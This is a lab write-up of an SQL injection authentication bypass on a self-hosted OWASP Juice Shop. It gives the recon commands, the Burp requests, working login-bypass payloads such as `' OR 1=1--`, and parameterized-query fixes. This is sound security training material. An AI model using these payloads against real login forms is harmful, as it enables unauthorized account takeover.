# OWASP Juice Shop: authentication bypass via SQL injection

| Field | Value |
|---|---|
| Platform | OWASP Juice Shop (self-hosted in home lab) |
| Type | Web |
| Difficulty | Easy (1 star) |
| Date solved | 2026-02-14 |
| Time spent | 1.5 hours including the writeup |
| Hints used | None |
| Tags | web, sqli, authentication, owasp-a05, owasp-a07 |

> Authorization: Juice Shop is an open-source application published by OWASP for training, running on my own machine at `10.10.10.20`. It is designed to be attacked and its writeups are meant to be shared. See [../legal-and-ethics.md](../legal-and-ethics.md).

This is a worked example of the [template](TEMPLATE.md), written to the standard expected in the rest of the repo.

## Summary

Juice Shop's login form builds its SQL query by concatenating user input, so a crafted email field closes the string and comments out the password check. Submitting `' OR 1=1--` as the email logs in as the first user in the database, who happens to be the administrator. The root cause is a query built by string concatenation instead of parameterization. This single bug covers two OWASP Top 10:2025 categories: A05 Injection and A07 Authentication Failures.

## Reconnaissance

The target is a single container on the lab network. A quick scan confirms one web service.

```bash
nmap -sC -sV -p- -oN nmap/juice.txt 10.10.10.20
```

| Port | Service | Version | Note |
|---|---|---|---|
| 3000 | HTTP | Node.js (Express) | Single-page application, REST API under `/rest` and `/api` |

Browsing to `http://10.10.10.20:3000` loads an Angular storefront. The login page is at `/#/login`.

## Enumeration

With Burp Suite set as the browser proxy, I submitted a deliberately wrong login (`test@test.com` / `wrong`) and watched the request:

```http
POST /rest/user/login HTTP/1.1
Host: 10.10.10.20:3000
Content-Type: application/json

{"email":"test@test.com","password":"wrong"}
```

The response is `401 Unauthorized` with body `{"error":"Invalid email or password."}`.

The single quote is the first thing to test against any login. I sent `email` as `'` and left the password as anything:

```json
{"email":"'","password":"x"}
```

The response changed to `500 Internal Server Error` and leaked the failing query and the engine:

```
SQLITE_ERROR: unrecognized token: "'" ...
SELECT * FROM Users WHERE email = ''' AND password = '...' AND deletedAt IS NULL
```

Two things are now clear. The backend is SQLite, and the email value is concatenated straight into the `WHERE` clause. A verbose error returned to the client is itself a finding (A02 Security Misconfiguration and A10 Mishandling of Exceptional Conditions), and it hands an attacker the exact query shape to break.

## Exploitation

The query is:

```sql
SELECT * FROM Users WHERE email = '<input>' AND password = '<hash of input>' AND deletedAt IS NULL
```

Setting the email to `' OR 1=1--` makes it:

```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...' AND deletedAt IS NULL
```

`OR 1=1` makes the `WHERE` clause true for every row, and `--` comments out the rest of the line, including the password check. The application logs in as the first row returned, which is the administrator.

I sent this from Burp Repeater:

```json
{"email":"' OR 1=1--","password":"anything"}
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"authentication":{"token":"eyJ0eXAiOiJKV1Qi...","bid":1,"umail":"admin@juice-sh.op"}}
```

The same input typed directly into the email box on the login page logs the browser in as `admin@juice-sh.op`. Juice Shop records the "Login Admin" challenge as solved.

## Privilege escalation

Not applicable: the first user returned is already the administrator, so the injection grants admin access directly. To log in as a specific user instead, the payload `victim@juice-sh.op'--` selects that user and comments out the password check.

## Proof

- Logged in as `admin@juice-sh.op` without a valid password.
- The Juice Shop score board marks the "Login Admin" challenge solved.
- A valid JWT for the admin account is returned (token truncated above).

## Root cause and fixes

| Finding | Root cause | Fix | Reference |
|---|---|---|---|
| SQL injection in login | The query concatenates the `email` value directly into SQL | Use parameterized queries or an ORM that binds parameters; never build SQL by string concatenation | [OWASP A05:2025 Injection](https://owasp.org/Top10/2025/0x00_2025-Introduction/), [SQLi Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) |
| Authentication bypass | The password check lives in the same injectable query, so it can be commented out | Separate authentication from query building; verify a securely hashed password in application code | [OWASP A07:2025 Authentication Failures](https://owasp.org/Top10/2025/0x00_2025-Introduction/) |
| Verbose error disclosure | The raw database error is returned to the client | Return a generic error; log details server-side only | [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling) |

Correct code binds the input instead of concatenating it:

```js
// Vulnerable (concatenation)
db.query(`SELECT * FROM Users WHERE email = '${email}' AND password = '${hash}'`)

// Fixed (parameter binding)
db.query('SELECT * FROM Users WHERE email = ? AND password = ?', [email, hash])
```

## ATT&CK mapping

| Tactic | Technique | Where in this box |
|---|---|---|
| Initial Access | T1190 Exploit Public-Facing Application | Injecting into the login endpoint |
| Credential Access | T1212 Exploitation for Credential Access | Bypassing authentication to obtain an admin session |

## Lessons learned

- Always test a single quote first. The 500 error and the leaked query made the rest trivial.
- A verbose error is not a minor issue; here it revealed the engine and the exact query.
- The same defect maps to two Top 10 categories, which is worth stating explicitly in a report because it raises the severity.
- Next time I will also test for blind injection on endpoints that do not return errors, since real targets rarely leak the query.

## References

- [OWASP Juice Shop project](https://owasp.org/www-project-juice-shop/)
- [OWASP Top 10:2025](https://owasp.org/Top10/2025/0x00_2025-Introduction/)
- [PortSwigger SQL injection labs](https://portswigger.net/web-security/sql-injection)
